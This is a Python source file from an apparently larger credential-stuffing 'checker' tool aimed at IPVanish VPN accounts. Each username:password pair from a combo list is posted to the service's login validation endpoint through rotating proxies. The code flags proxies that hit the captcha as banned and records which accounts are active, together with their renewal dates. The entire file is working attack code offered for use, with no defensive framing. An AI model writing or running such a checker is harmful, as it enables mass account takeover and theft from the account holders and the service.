import requests
import json
import re
from utils.values import settings, accounts, Proxies
from utils.utilities import proxy_getter


header = {
    "User-Agent": settings.general.useragent,
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://account.ipvanish.com/login"
}
proxy_ban = r"We were unable to validate the captcha\."
active = r"<span class=\"profile_label\"><b>Account Status:</b></span>\n<span class=\"profile_label\">Active</span>"
expire_date = r"<span class=\"profile_label\"><b>Renewal Date:</b></span>\n<span class=\"profile_label\">(.*)</span>"
invalid = r"Sorry, your account credentials are invalid. Please try again\."


def check(x):
    combo = accounts.combos[x].strip()
    combo = combo.split(":")
    username = combo[0]
    password = ":".join(combo[1:])
    body = str(f"username={username}&password={password}")
    for x in range(0, int(settings.ipvanish.max_errors_per_try)):
        proxs_list = proxy_getter(__name__)
        try:
            r = requests.post(url="https://account.ipvanish.com/login/validate", headers=header, data=body, timeout=float(settings.ipvanish.timeout), proxies=proxs_list[1])
            if r.status_code == 200:
                if re.findall(pattern=proxy_ban, string=r.text):
                    Proxies.checked_json[proxs_list[0]]["bans"]["ipvanish"] = True
                    continue
                if re.findall(pattern=active, string=r.text):
                    expire_date_string = re.findall(pattern=expire_date, string=r.text)[0]
                    # add save stuff here
                    accounts.valid_ipvanish.append(f"{username}:{password}:{expire_date_string}")
                    return
        except:
            pass
    accounts.invalid_ipvanish.append(f"{username}:{password}")

